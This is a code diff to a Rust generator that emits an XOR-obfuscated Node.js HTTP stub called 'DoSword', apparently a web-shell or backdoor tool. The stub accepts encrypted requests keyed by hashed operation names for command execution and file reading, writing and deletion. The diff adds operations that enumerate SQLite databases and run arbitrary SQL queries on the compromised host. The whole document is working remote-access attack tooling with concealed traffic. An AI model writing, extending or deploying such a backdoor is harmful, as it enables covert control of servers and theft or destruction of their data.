@@ -18,6 +18,8 @@ pub fn node_stub(
     h_rename: &str,
     h_mkdir: &str,
     h_touch: &str,
+    h_dbprobe: &str,
+    h_dbquery: &str,
 ) -> String {
     format!(
         r#"// DoSword generated stub (node, xor)
@@ -32,7 +34,7 @@ function dec(hexstr, k) {{ let out = ''; for (let i = 0; i < hexstr.length; i +=
 const KEY = Buffer.from(dec('{key_hex}', '{xk}'), 'utf8');
 function x(d) {{ const b = Buffer.isBuffer(d) ? d : Buffer.from(d); return Buffer.from(b.map((v, i) => v ^ KEY[i % KEY.length])); }}
 function h(op) {{ return parseInt(crypto.createHash('md5').update(op).digest('hex').slice(0, 8), 16).toString(); }}
-const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_read}', write: '{h_write}', delete: '{h_delete}', rename: '{h_rename}', mkdir: '{h_mkdir}', touch: '{h_touch}' }};
+const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_read}', write: '{h_write}', delete: '{h_delete}', rename: '{h_rename}', mkdir: '{h_mkdir}', touch: '{h_touch}', dbprobe: '{h_dbprobe}', dbquery: '{h_dbquery}' }};
 
 const PORT = Number(process.env.PORT || 8000);
 http.createServer((req, res) => {{
@@ -108,6 +110,41 @@ http.createServer((req, res) => {{
       }} else if (hh === H.touch) {{
         const t = Number(reqObj.t) || Math.floor(Date.now() / 1000);
         fs.utimesSync(reqObj.p || '', t, t);
+      }} else if (hh === H.dbprobe) {{
+        const c = JSON.parse(reqObj.c || '{{}}');
+        if (c.driver === 'sqlite') {{
+          const {{ DatabaseSync }} = require('node:sqlite');
+          const db = new DatabaseSync(c.dbname || ':memory:');
+          const rows = db.prepare("SELECT name FROM sqlite_master WHERE type='table' UNION SELECT 'main'").all();
+          out.data = {{ databases: rows.map((r) => r.name) }};
+          db.close();
+        }} else {{
+          out = {{ ok: false, error: 'unsupported driver ' + c.driver }};
+        }}
+      }} else if (hh === H.dbquery) {{
+        const c = JSON.parse(reqObj.c || '{{}}');
+        const q = reqObj.q || '';
+        if (c.driver !== 'sqlite') {{
+          out = {{ ok: false, error: 'dbquery 仅支持 sqlite（Node 端）' }};
+        }} else {{
+          const {{ DatabaseSync }} = require('node:sqlite');
+          const db = new DatabaseSync(c.dbname || ':memory:');
+          try {{
+            const upper = q.trim().toUpperCase();
+            if (upper.startsWith('SELECT') || upper.startsWith('PRAGMA') || upper.startsWith('SHOW') || upper.startsWith('WITH')) {{
+              const stmt = db.prepare(q);
+              const cols = stmt.columns().map((x) => x.name);
+              const rows = stmt.all().map((r) => cols.map((cn) => (r[cn] === null || r[cn] === undefined ? null : String(r[cn]))));
+              out.data = {{ columns: cols, rows, affected: 0 }};
+            }} else {{
+              const info = db.prepare(q).run();
+              out.data = {{ columns: [], rows: [], affected: Number(info.changes) }};
+            }}
+          }} catch (qe) {{
+            out = {{ ok: false, error: String(qe && qe.message ? qe.message : qe) }};
+          }}
+          db.close();
+        }}
       }}
     }} catch (e) {{
       out = {{ ok: false, error: String(e && e.message ? e.message : e) }};
@@ -126,6 +163,8 @@ http.createServer((req, res) => {{
         h_rename = h_rename,
         h_mkdir = h_mkdir,
         h_touch = h_touch,
+        h_dbprobe = h_dbprobe,
+        h_dbquery = h_dbquery,
     )
     .replace("{xk}", xk)
     .replace("{gk_hex}", gk_hex)
